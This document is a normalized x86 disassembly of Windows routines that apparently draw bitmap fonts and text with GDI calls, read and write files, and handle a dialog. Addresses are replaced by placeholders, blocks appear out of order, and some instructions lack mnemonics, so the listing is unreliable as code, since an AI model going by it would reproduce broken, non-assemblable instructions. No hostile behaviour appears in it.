cmp edi 0xffffffff
jne r-xdata
push ebx
mov ebx [ WriteFile@IAT ]
push esi
xor esi esi
mov al [ rw-data ]
test al al
jne r-xdata
inc esi
cmp esi 0x1932
jle r-xdata
mov ecx esi
call sub_413930
or eax 0x8080
movzx cx ah
push 0x0
mov ch al
lea edx [ esp + 0x18 ]
push edx
push 0x2
lea eax [ esp + 0x1c ]
push eax
push edi
mov [ esp + 0x24 ] ecx
call ebx
pop edi
mov eax 0x1
pop ebp
add esp 0x8
retn
mov eax [ rw-data ]
push eax
push 0x80
push 0x1
call sub_421530
add esp 0xc
cmp [ esi + ebp ] 0x0
je r-xdata
push edi
call [ CloseHandle@IAT ]
pop esi
pop ebx
pop edi
xor eax eax
pop ebp
add esp 0x8
retn
sub_413b90
push ebx
push ebp
mov ebp ecx
push esi
mov ecx rw-data
call sub_4139c0
mov esi [ ebp + 0x4c ]
test esi esi
mov ebx eax
je r-xdata
mov ecx ebp
call sub_40e1a0
mov ecx rw-data
call sub_4139c0
sub eax ebx
push eax
call sub_4139c0
mov edx [ rw-data ]
push eax
neg ebx
sbb ebx ebx
push 0x0
and ebx 0x5
push 0x7f
add ebx 0x7e
push ebx
push edx
call sub_420e20
add esp 0x18
pop esi
pop ebp
mov ecx rw-data
pop ebx
jmp sub_413af0
push edi
lea esp [ esp ]
mov esi [ esi ]
test esi esi
jne r-xdata
lea esp [ esp ]
mov eax [ esi + 0x18 ]
xor edi edi
test eax eax
jle r-xdata
pop edi
mov eax [ esi + 0x18 ]
inc edi
cmp edi eax
jl r-xdata
movzx ecx ax
push ecx
mov ecx rw-data
call sub_413990
mov eax [ esi + 0x10 ]
mov ax [ eax + edi * 2 ]
cmp ax 0x3000
jb r-xdata
sub_413c60
mov edx [ esp + 0x4 ]
mov al [ esp + 0x8 ]
sub esp 0x8
lea ecx [ esp ]
push ecx
push 0x1
push rw-data
push edx
mov [ rw-data ] al
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp ]
add esp 0x8
retn
sub_413c90
mov ecx rw-data
call sub_413850
mov ecx rw-data
call sub_413850
mov ecx rw-data
call sub_413850
mov ecx rw-data
call sub_413850
mov ecx rw-data
call sub_413850
mov ecx rw-data
call sub_413850
mov ecx [ rw-data ]
call sub_412f00
mov ecx [ rw-data ]
call sub_412f00
mov ecx [ rw-data ]
call sub_412f00
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_413d00
push ebx
push esi
mov esi [ esp + 0x14 ]
mov [ esi ] 0xffffffff
mov bl [ rw-data ]
test bl bl
je r-xdata
pop esi
pop ebx
retn 0xc
mov eax [ esp + 0xc ]
cmp eax 0x3000
jl r-xdata
push eax
mov ecx rw-data
call sub_4139e0
cmp bl 0x1
jne r-xdata
test eax eax
jne r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
mov eax [ esp + 0x10 ]
push edx
push eax
call [ SetTextColor@IAT ]
mov [ esi ] eax
mov eax [ rw-data ]
mov ecx [ esp + 0x10 ]
push eax
push ecx
call [ SetTextColor@IAT ]
mov [ esi ] eax
pop esi
pop ebx
retn 0xc
sub_413d90
mov eax [ esp + 0xc ]
sub esp 0x408
push ebx
push esi
mov esi [ esp + 0x414 ]
push edi
mov edi ecx
mov ecx [ esp + 0x41c ]
push eax
push ecx
push esi
mov ecx edi
call sub_413d00
mov edx [ edi ]
push esi
mov ecx edi
call [ edx + 0x8 ]
mov edx [ edi + 0x1c ]
test edx edx
mov ebx eax
mov [ esp + 0x418 ] ebx
jne r-xdata
movsx ecx [ rw-data ]
lea esi [ ebx + 0x1 ]
call sub_412ee0
mov ecx eax
test ecx ecx
je r-xdata
movsx eax [ edi + 0x14 ]
pop edi
imul eax ebx
pop esi
pop ebx
add esp 0x408
retn 0xc
movsx eax [ edi + 0x16 ]
mov ecx [ edi + 0x28 ]
imul eax ebx
push 0x0
push 0x0
add eax 0x40
push eax
push ecx
call [ SetFilePointer@IAT ]
mov cx [ edi + 0x16 ]
mov ax [ edi + 0x14 ]
cmp ax cx
jne r-xdata
movsx eax [ edi + 0x14 ]
pop edi
dec ecx
pop esi
imul eax ecx
pop ebx
add esp 0x408
retn 0xc
mov edx [ edi + 0x18 ]
movsx esi ax
movsx eax [ edi + 0x20 ]
imul esi eax
push ebp
push 0x0
add esi edx
movsx eax cx
lea edx [ esp + 0x14 ]
push edx
mov edx [ edi + 0x28 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
push edx
call [ ReadFile@IAT ]
xor ebp ebp
cmp [ edi + 0x6 ] bp
lea ebx [ esp + 0x14 ]
jle r-xdata
movsx ecx [ edi + 0x20 ]
mov esi [ edi + 0x18 ]
movsx eax ax
imul ecx eax
push 0x0
lea edx [ esp + 0x10 ]
push edx
mov edx [ edi + 0x28 ]
push eax
add ecx esi
push ecx
push edx
call [ ReadFile@IAT ]
jmp r-xdata
mov ebx [ esp + 0x41c ]
pop ebp
jmp r-xdata
movsx edx [ edi + 0x20 ]
mov eax [ edi + 0x1c ]
inc ebx
mov [ eax + edx * 2 ] bx
xor eax eax
mov ax [ edi + 0x20 ]
movsx ecx ax
inc eax
mov [ edi + 0x20 ] ax
cmp ax [ rw-data ]
jne r-xdata
movsx eax [ edi + 0x14 ]
pop edi
imul eax ecx
pop esi
pop ebx
add esp 0x408
retn 0xc
mov [ edi + 0x20 ] 0x0
movsx eax [ edi + 0x4 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
xor ecx ecx
test eax eax
jle r-xdata
mov [ esi ] 0x0
movsx ecx [ edi + 0x6 ]
inc esi
inc ebp
cmp ebp ecx
jl r-xdata
mov al [ ebx ]
mov [ esi ] al
movsx eax [ edi + 0x4 ]
cdq
and edx 0x7
inc esi
add eax edx
inc ebx
inc ecx
sar eax 0x3
cmp ecx eax
jl r-xdata
sub_413f10
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
push eax
push edi
push ebx
mov esi ecx
call sub_413d00
push 0x1
push edi
call [ SetBkMode@IAT ]
mov ecx [ esi + 0x10 ]
mov ebp [ SelectObject@IAT ]
push ecx
push edi
call ebp
mov edx [ esi ]
push ebx
mov ecx esi
mov [ esi + 0x10 ] eax
call [ edx + 0x8 ]
movsx ecx [ esi + 0x16 ]
mov edx [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
push 0x0
push 0x1
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x1c ]
push eax
push 0x0
add ecx edx
movsx edx [ esi + 0x14 ]
push 0x10
push ecx
add edx ebx
push edx
push edi
call [ ExtTextOutA@IAT ]
mov eax [ esi + 0x10 ]
push eax
push edi
call ebp
mov [ esi + 0x10 ] eax
mov eax [ esp + 0x18 ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x10
push eax
push edi
call [ SetTextColor@IAT ]
sub_413fa0
mov eax [ esp + 0x8 ]
sub eax 0x2
push esi
push edi
je r-xdata
mov edx [ esp + 0xc ]
push edx
call sub_4258e0
add esp 0x4
mov [ rw-data ] 0x0
sub eax 0x10e
je r-xdata
mov esi [ esp + 0xc ]
push 0x1
push esi
call sub_4258a0
mov ecx [ rw-data ]
add esp 0x8
push ecx
push 0x0
push 0x405
push 0x669
push esi
mov [ rw-data ] esi
call [ SendDlgItemMessageA@IAT ]
pop edi
mov eax 0x1
pop esi
retn
dec eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn
mov edi [ esp + 0x14 ]
movzx eax di
cmp eax 0x3e7
jg r-xdata
cmp eax 0x668
jne r-xdata
je r-xdata
push ebx
push ebp
mov ecx rw-data
call sub_4139c0
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push 0x409
push 0x669
push edx
mov ebx eax
call [ SendDlgItemMessageA@IAT ]
cmp di 0x668
mov esi eax
jne r-xdata
dec eax
je r-xdata
xor edi edi
test esi esi
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
dec eax
jne r-xdata
mov ecx rw-data
call sub_4139c0
mov edx [ rw-data ]
mov ecx eax
sub ecx ebx
push ecx
push eax
push 0x0
push 0x7f
push 0x83
push edx
mov ebp [ esp + 0x18 ]
mov ecx rw-data
call sub_4139c0
mov ecx [ rw-data ]
sub ebx eax
push ebx
push eax
push 0x0
push 0x7f
push 0x84
push ecx
jmp r-xdata
mov ebp [ esp + 0x18 ]
mov eax [ esp + 0xc ]
push eax
call [ DestroyWindow@IAT ]
pop edi
xor eax eax
pop esi
retn
movzx edx [ ebp + edi * 2 ]
push edx
mov ecx rw-data
call sub_413990
inc edi
cmp edi esi
jl r-xdata
call sub_420e20
add esp 0x18
mov ecx rw-data
call sub_413af0
mov eax [ esp + 0x14 ]
push eax
call [ DestroyWindow@IAT ]
pop ebp
pop ebx
pop edi
xor eax eax
pop esi
retn
movzx eax [ ebp + edi * 2 ]
push eax
mov ecx rw-data
call sub_413ad0
inc edi
cmp edi esi
jl r-xdata
sub_414120
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push 0x0
push sub_413fa0
push eax
push 0x3b3
call sub_420cd0
add esp 0x10
retn
push eax
call [ SetForegroundWindow@IAT ]
retn
sub_414150
push esi
push 0x30
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
xor esi esi
mov ecx eax
call sub_413d70
mov esi eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
push edx
mov ecx esi
call sub_4130e0
test eax eax
je r-xdata
xor eax eax
pop esi
retn
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
mov ecx esi
call sub_412f00
xor esi esi
sub_4141a0
push ecx
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
mov esi [ lstrlenA@IAT ]
push edi
mov ebx eax
call esi
cmp eax 0x4
jl r-xdata
mov ecx [ esp + 0x18 ]
push ebp
push ecx
push edi
call sub_414150
add esp 0xc
mov esi eax
push r--data
push edi
call esi
lea eax [ eax + edi - 0x4 ]
push eax
call sub_431aa6
add esp 0x8
test eax eax
je r-xdata
xor esi esi
cmp ebx esi
mov [ esp + 0xc ] esi
jne r-xdata
push 0x44
call sub_42991a
add esp 0x4
cmp eax esi
je r-xdata
mov ecx [ rw-data ]
push ecx
call [ GetDC@IAT ]
mov ebx eax
mov [ esp + 0xc ] ebx
test esi esi
jne r-xdata
mov ecx eax
call sub_413300
mov esi eax
mov edx [ esp + 0x14 ]
push ebp
push edx
push edi
push ebx
mov ecx esi
call sub_413490
test eax eax
je r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov ecx esi
call sub_412f00
xor esi esi
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ rw-data ]
push ebx
push eax
call [ ReleaseDC@IAT ]
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_414270
sub esp 0x10
push esi
mov esi ecx
mov al [ esi + 0xd ]
test al al
je r-xdata
mov edx [ esp + 0x1c ]
push edi
mov edi [ esp + 0x1c ]
lea ecx [ esp + 0x1c ]
push ecx
push edi
push edx
mov ecx esi
call sub_413d90
mov ecx [ esi + 0x18 ]
movsx edx [ esi + 0x14 ]
add ecx eax
mov eax [ esi + 0x2c ]
push ecx
push edx
push eax
call [ SetBitmapBits@IAT ]
movsx eax [ esi + 0x6 ]
mov ecx [ esi + 0x24 ]
movsx edx [ esi + 0x4 ]
push 0xcc0020
push 0x0
push 0x0
push ecx
mov ecx [ esp + 0x38 ]
push eax
push edx
movsx edx [ esi + 0x12 ]
sub ecx eax
mov eax [ esp + 0x3c ]
push ecx
add edx eax
push edx
push edi
call [ BitBlt@IAT ]
mov eax [ esp + 0x1c ]
cmp eax 0xffffffff
je r-xdata
movsx ecx [ esi + 0x6 ]
mov eax [ esp + 0x24 ]
mov edx eax
sub edx ecx
movsx ecx [ esi + 0x4 ]
inc edx
inc eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x20 ]
add ecx eax
mov [ esp + 0x4 ] eax
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x1c ]
push ecx
mov [ esp + 0x10 ] edx
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x4 ]
pop esi
add esp 0x10
retn 0x10
pop edi
pop esi
add esp 0x10
retn 0x10
push eax
push edi
call [ SetTextColor@IAT ]
sub_414340
sub esp 0x430
push ebx
push ebp
push esi
mov esi [ esp + 0x444 ]
push edi
mov ebp ecx
mov ecx [ esp + 0x444 ]
lea eax [ esp + 0x38 ]
push eax
push ecx
push esi
mov ecx ebp
mov [ esp + 0x38 ] ebp
call sub_413d90
mov edi [ ebp + 0x18 ]
add edi eax
mov al [ ebp + 0xd ]
xor ecx ecx
test al al
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x14 ] edi
je r-xdata
mov esi [ esp + 0x44c ]
movsx eax [ ebp + 0x4 ]
mov [ esp + 0x10 ] eax
add eax 0xf
cdq
and edx 0xf
add eax edx
mov ebx eax
sar ebx 0x4
shl ebx 0x1
mov ecx 0x24
mov edx rw-data
mov [ esp + 0x24 ] ebx
call sub_412ee0
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x430
retn 0xc
push eax
push esi
call [ SetTextColor@IAT ]
mov ecx 0x1a
mov edx rw-data
call sub_412ee0
test eax eax
je r-xdata
movsx ecx [ ebp + 0x14 ]
mov edx ecx
shr ecx 0x2
lea edi [ esp + 0x3c ]
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ esp + 0x10 ]
test eax eax
jle r-xdata
mov ecx [ esp + 0x2c ]
movsx edi [ ecx + 0x6 ]
xor ebp ebp
test edi edi
jle r-xdata
lea eax [ esp + 0x3c ]
mov [ esp + 0x14 ] eax
mov edi eax
movsx ecx [ ebp + 0x6 ]
lea edx [ eax - 0x1 ]
mov [ esp + 0x30 ] ecx
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x28 ] edx
mov [ esp + 0x34 ] eax
lea ebx [ ebx ]
mov eax [ esp + 0x10 ]
xor esi esi
test eax eax
mov [ esp + 0x18 ] ebp
jle r-xdata
xor esi esi
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x34 ]
dec edx
add ecx ebx
dec eax
mov [ esp + 0x28 ] edx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x34 ] eax
jne r-xdata
mov eax [ esp + 0x28 ]
cdq
mov esi 0x8
idiv esi
xor edi edi
movzx esi [ edx + rw-data ]
mov ebp eax
mov ecx [ esp + 0x10 ]
dec ecx
test ecx ecx
mov [ esp + 0x1c ] esi
jl r-xdata
lea esp [ esp ]
inc ebp
add esi ebx
cmp ebp edi
jl r-xdata
nop
mov eax [ esp + 0x30 ]
xor ecx ecx
test eax eax
jle r-xdata
mov esi [ esp + 0x448 ]
mov eax [ esp + 0x30 ]
inc ecx
add edi ebx
cmp ecx eax
jl r-xdata
mov eax ecx
cdq
and edx 0x7
add eax edx
mov edx [ esp + 0x20 ]
sar eax 0x3
add eax edx
mov edx ecx
and edx 0x80000007
lea eax [ esp + eax + 0x3c ]
jns r-xdata
mov esi [ esp + 0x44c ]
mov eax [ esi + 0x8 ]
sub eax [ esi ]
imul eax [ esp + 0x1c ]
cdq
idiv edi
mov edi [ esi + 0x4 ]
mov edx [ esp + 0x18 ]
mov ebp [ esp + 0x2c ]
mov [ esp + 0x1c ] eax
mov eax [ esi + 0xc ]
sub eax edi
mov edi [ esp + 0x10 ]
sub ecx edi
lea ecx [ ecx + edx + 0x1 ]
imul eax ecx
cdq
idiv edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
jmp r-xdata
lea ebx [ ebx ]
mov eax [ esp + 0x10 ]
inc esi
cmp esi eax
jl r-xdata
mov eax esi
and eax 0x80000007
jns r-xdata
mov eax [ esp + 0x10 ]
xor ecx ecx
test eax eax
jle r-xdata
jmp r-xdata
mov dl [ edx + rw-data ]
mov ebx [ esp + 0x14 ]
test [ eax + ebx ] dl
mov eax [ esp + 0x10 ]
je r-xdata
dec edx
or edx 0xfffffff8
inc edx
mov edx [ esp + 0x14 ]
lea eax [ edi + ebp ]
movsx eax [ eax + edx ]
test esi eax
je r-xdata
mov ebp [ esp + 0x2c ]
mov dl [ edx + rw-data ]
or [ eax ] dl
dec edx
or edx 0xfffffff8
inc edx
movsx edx [ ebp + 0x14 ]
mov eax [ ebp + 0x2c ]
push edi
push edx
push eax
call [ SetBitmapBits@IAT ]
movsx edx [ ebp + 0x6 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push 0xcc0020
push edx
movsx edx [ ebp + 0x4 ]
mov edi [ esp + 0x24 ]
push edx
mov edx [ ebp + 0x24 ]
mov ebp [ esp + 0x24 ]
push 0x0
push 0x0
push edx
mov edx [ esi + 0xc ]
sub edx eax
push edx
mov edx [ esi + 0x8 ]
mov esi [ esp + 0x460 ]
sub edx ecx
push edx
sub eax ebp
push eax
sub ecx edi
push ecx
push esi
call [ StretchBlt@IAT ]
mov eax [ esp + 0x38 ]
cmp eax 0xffffffff
je r-xdata
dec ecx
jns r-xdata
mov eax ecx
and eax 0x80000007
jns r-xdata
xor ecx ecx
test edi edi
jle r-xdata
movzx ebp [ eax + rw-data ]
mov eax esi
cdq
and edx 0x7
add eax edx
mov edx [ esp + 0x14 ]
sar eax 0x3
add eax edx
lea esp [ esp ]
dec eax
or eax 0xfffffff8
inc eax
cmp ecx eax
jl r-xdata
inc ecx
cmp ecx eax
jl r-xdata
xor esi esi
test edi edi
jle r-xdata
movzx ebp [ eax + rw-data ]
mov eax ecx
cdq
and edx 0x7
add eax edx
mov edx [ esp + 0x14 ]
sar eax 0x3
add eax edx
lea esp [ esp ]
dec eax
or eax 0xfffffff8
inc eax
cmp ecx edi
jl r-xdata
inc ecx
add eax ebx
cmp ecx edi
jl r-xdata
mov ebx [ esp + 0x24 ]
mov ebx [ esp + 0x24 ]
mov eax ecx
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov edx ecx
add eax esi
and edx 0x80000007
jns r-xdata
jmp r-xdata
cmp esi edi
jl r-xdata
inc esi
add eax ebx
cmp esi edi
jl r-xdata
movsx edx [ eax ]
test ebp edx
je r-xdata
jmp r-xdata
movsx edx [ eax ]
test ebp edx
je r-xdata
jmp r-xdata
sub_4146a0
sub esp 0x3c
push esi
push edi
mov esi ecx
call sub_413850
mov eax [ esp + 0x58 ]
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x4c ]
mov edi [ esp + 0x48 ]
push eax
mov eax [ esp + 0x58 ]
push ecx
push edx
mov [ esi + 0x18 ] 0x0
call sub_4141a0
mov ecx eax
add esp 0xc
test ecx ecx
mov [ esi + 0x20 ] ecx
jne r-xdata
mov ax [ ecx + 0x6 ]
mov [ esi ] ax
mov dx [ ecx + 0x6 ]
mov di ax
inc dx
mov [ esi + 0x4 ] dx
movsx eax di
cdq
and edx 0x3
add eax edx
push ebx
mov ebx eax
sar ebx 0x2
mov [ esi + 0xe ] bx
movsx eax [ ecx + 0x4 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ esi + 0x10 ] ax
mov ax [ ecx + 0xa ]
add ax [ ecx + 0x4 ]
push rw-data
mov [ esi + 0x2 ] ax
mov ax [ ecx + 0x8 ]
shl ax 0x1
add ax [ ecx + 0x6 ]
lea edx [ esp + 0x2c ]
mov [ esi + 0x6 ] ax
sub ax [ ecx + 0x8 ]
mov cx [ esi + 0x10 ]
mov [ esi + 0xc ] ax
xor eax eax
mov ax [ esi + 0x6 ]
mov [ esi + 0x8 ] ax
mov [ esi + 0x12 ] cx
mov ecx 0xf
push edx
sub eax edi
dec eax
add edi ebx
mov [ esi + 0x14 ] di
mov [ esi + 0xa ] ax
xor eax eax
lea edi [ esp + 0x14 ]
[ edi ]
call [ lstrcpyA@IAT ]
movsx eax [ esi ]
lea ecx [ esp + 0xc ]
neg eax
push ecx
mov [ esp + 0x10 ] eax
call [ CreateFontIndirectA@IAT ]
test eax eax
mov [ esi + 0x1c ] eax
jne r-xdata
pop edi
pop esi
add esp 0x3c
retn 0x14
mov edx [ rw-data ]
push ebp
push edx
call [ GetDC@IAT ]
mov ebp [ SelectObject@IAT ]
mov ebx eax
mov eax [ esi + 0x1c ]
push eax
push ebx
call ebp
xor edi edi
mov [ esp + 0x60 ] eax
add esi 0x24
pop ebx
pop edi
pop esi
add esp 0x3c
retn 0x14
push edi
push ebx
call sub_413c60
add esp 0x8
mov [ esi ] ax
inc edi
add esi 0x2
cmp edi 0x100
jl r-xdata
mov ecx [ esp + 0x60 ]
push ecx
push ebx
call ebp
mov edx [ rw-data ]
push ebx
push edx
call [ ReleaseDC@IAT ]
pop ebp
pop ebx
pop edi
mov eax 0x1
pop esi
add esp 0x3c
retn 0x14
sub_414800
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x8 ]
mov edx [ ecx + 0x4 ]
push esi
sub eax [ ecx ]
mov esi [ ecx + 0xc ]
sub esi edx
cmp eax esi
jge r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
pop esi
retn
mov al [ rw-data ]
test al al
push edi
jne r-xdata
mov eax [ rw-data ]
mov cl [ eax + 0xc ]
test cl cl
je r-xdata
push 0x0
push 0x1
push esi
xor eax eax
mov edi rw-data
call sub_4141a0
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ rw-data ]
mov al [ ecx + 0xc ]
test al al
je r-xdata
push 0x0
push 0x1
push esi
xor eax eax
mov edi rw-data
call sub_4141a0
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
pop edi
push 0x0
push 0x1
push r--data
call sub_414150
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
push 0x0
push 0x1
push esi
xor eax eax
mov edi rw-data
call sub_4141a0
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
push eax
push 0x1
push r--data
call sub_414150
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
sub_4148e0
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
mov al [ rw-data ]
test al al
push edi
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x6 ] 0x10
je r-xdata
push 0x0
push 0x1
push 0x10
xor eax eax
mov edi rw-data
call sub_4141a0
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
pop edi
mov cl [ eax + 0xc ]
test cl cl
je r-xdata
push 0x0
push 0x1
push 0x10
xor eax eax
mov edi rw-data
call sub_4141a0
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
sub_414950
mov ecx [ rw-data ]
push ebx
push ebp
push esi
push edi
call sub_412f00
mov ebx [ esp + 0x14 ]
push 0x5a
push ebx
mov [ rw-data ] 0x0
call [ GetDeviceCaps@IAT ]
mov ecx eax
movsx eax [ rw-data ]
imul ecx eax
mov esi [ esp + 0x18 ]
mov eax 0xb60b60b7
imul ecx
mov al [ rw-data ]
add edx ecx
sar edx 0x9
mov ecx edx
shr ecx 0x1f
add edx ecx
test al al
mov ebp edx
jne r-xdata
mov edx [ rw-data ]
mov al [ edx + 0xc ]
test al al
je r-xdata
push esi
push 0x1
push ebp
mov eax ebx
mov edi rw-data
call sub_4141a0
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
push esi
push 0x1
push r--data
call sub_414150
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
push esi
push 0x1
push ebp
mov eax ebx
mov edi rw-data
call sub_4141a0
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
push esi
push 0x1
push r--data
call sub_414150
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
mov cl [ eax + 0xc ]
test cl cl
je r-xdata
mov eax [ rw-data ]
push esi
push 0x1
push r--data
call sub_414150
add esp 0xc
test eax eax
mov [ rw-data ] eax
jne r-xdata
sub_414a50
mov cl [ eax + 0x2a ]
test cl cl
jne r-xdata
mov eax [ esp + 0x4 ]
push eax
mov ecx esi
call sub_413880
movzx ecx [ rw-data ]
movsx edx [ eax + 0x28 ]
push 0x0
push 0x0
push ecx
push edx
push eax
mov ecx esi
call sub_4146a0
test eax eax
jne r-xdata
retn
sub_414a90
sub esp 0x38
call sub_413c90
movzx eax [ rw-data ]
movsx ecx [ rw-data ]
push 0x0
push 0x0
push eax
push ecx
push rw-data
mov ecx rw-data
call sub_4146a0
test eax eax
jne r-xdata
push esi
push rw-data
mov esi rw-data
mov eax rw-data
call sub_414a50
push esi
mov esi rw-data
mov eax rw-data
call sub_414a50
push rw-data
mov esi rw-data
mov eax rw-data
call sub_414a50
push rw-data
mov esi rw-data
mov eax rw-data
call sub_414a50
mov al [ rw-data ]
add esp 0x10
test al al
jne r-xdata
movzx edx [ rw-data ]
push eax
push eax
push edx
push 0x10
push r--data
mov ecx rw-data
call sub_4146a0
test eax eax
jne r-xdata
push rw-data
mov ecx rw-data
call sub_413880
movzx eax [ rw-data ]
movsx ecx [ rw-data ]
push eax
push 0x0
push 0x1
push ecx
push rw-data
mov ecx rw-data
call sub_4146a0
test eax eax
jne r-xdata
mov eax 0x1
add esp 0x38
retn
mov edx [ rw-data ]
push edx
call [ GetDC@IAT ]
mov esi eax
lea eax [ esp + 0x4 ]
push eax
push esi
call [ GetTextMetricsA@IAT ]
mov ecx [ rw-data ]
push esi
push ecx
call [ ReleaseDC@IAT ]
mov dx [ esp + 0x4 ]
mov ecx rw-data
mov [ rw-data ] dx
call sub_413a40
xor eax eax
pop esi
add esp 0x38
retn
sub_414bc0
mov eax [ esp + 0x8 ]
push eax
neg eax
sbb eax eax
and eax 0xfffffff6
add eax 0xb
push eax
push 0x0
push 0x0
push r--data
mov ecx rw-data
call sub_425ab0
push eax
mov eax [ esp + 0x10 ]
push eax
call [ WinHelpA@IAT ]
retn
sub_414bf0
push ebp
mov ebp [ esp + 0xc ]
push edi
xor edi edi
test ebp ebp
jne r-xdata
test ebx ebx
mov eax [ esp + 0xc ]
jne r-xdata
mov ecx esi
call sub_40bad0
mov al [ eax ]
test al al
je r-xdata
cmp [ eax ] 0x0
je r-xdata
pop edi
test ebp ebp
pop ebp
jne r-xdata
cmp al 0x1f
jne r-xdata
lea ecx [ esp + 0xc ]
push ecx
call sub_418b70
add esp 0x4
push eax
mov ecx esi
call sub_40b760
mov edx [ esp + 0xc ]
cmp [ edx ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
inc eax
retn
push 0xffffffff
mov ecx esi
call sub_40b700
test al al
jns r-xdata
push 0x213d
jmp r-xdata
jmp r-xdata
mov ecx [ esp + 0xc ]
xor edx edx
mov dl [ ecx ]
and edx 0x7f
or edx ebx
push edx
push 0x28
mov ecx esi
call sub_40b760
mov edi 0x1
mov ecx esi
call sub_40b760
mov eax [ esp + 0xc ]
inc eax
mov [ esp + 0xc ] eax
mov al [ eax ]
test al al
jne r-xdata
test edi edi
je r-xdata
push 0x29
mov ecx esi
call sub_40b760
sub_414ca0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
mov edi eax
mov al [ rw-data ]
test al al
mov ebx ecx
mov esi edx
jne r-xdata
test ebp ebp
mov ecx esi
jne r-xdata
push 0x0
push edi
call sub_414bf0
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
retn
test ebx ebx
je r-xdata
call sub_40bad0
jmp r-xdata
push 0x2c
call sub_40b760
push 0x20
mov ecx esi
push 0x2122
jmp r-xdata
push 0x1
push edi
call sub_414bf0
add esp 0x8
mov edi eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebp eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
push 0xffffffff
mov ecx esi
call sub_40b700
call sub_40b760
sub_414d40
mov ecx [ esp + 0x8 ]
sub esp 0x40
mov eax ecx
dec eax
push esi
mov esi [ esp + 0x48 ]
je r-xdata
movsx edx [ rw-data ]
movsx eax [ rw-data ]
push 0x1
push edx
push eax
mov eax [ esp + 0x60 ]
mov ecx [ eax + 0x18 ]
mov edx [ eax + 0x1c ]
push ecx
push edx
push esi
call [ MoveWindow@IAT ]
xor eax eax
sub eax 0xe
je r-xdata
push ebx
push ebp
mov ebp [ esp + 0x50 ]
push edi
lea ecx [ esp + 0x10 ]
push ecx
push ebp
call [ BeginPaint@IAT ]
push 0x0
push ebp
mov esi eax
call [ GetWindowLongA@IAT ]
mov ebx [ GetSysColor@IAT ]
push 0xf
mov edi eax
call ebx
push eax
push esi
call [ SetBkColor@IAT ]
push 0x8
call ebx
push eax
push esi
call [ SetTextColor@IAT ]
cmp edi 0x1
jl r-xdata
sub eax 0x3f2
mov eax [ esp + 0x54 ]
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push ebp
call [ EndPaint@IAT ]
pop edi
pop ebp
pop ebx
xor eax eax
pop esi
add esp 0x40
retn 0x10
cmp edi 0xd6
jg r-xdata
push eax
push 0x0
push esi
call [ SetWindowLongA@IAT ]
push 0x1
push 0x0
push esi
call [ InvalidateRect@IAT ]
xor eax eax
pop esi
add esp 0x40
retn 0x10
mov edx [ esp + 0x50 ]
push eax
push edx
push ecx
mov eax esi
push eax
call [ DefWindowProcA@IAT ]
pop esi
add esp 0x40
retn 0x10
mov ecx [ rw-data ]
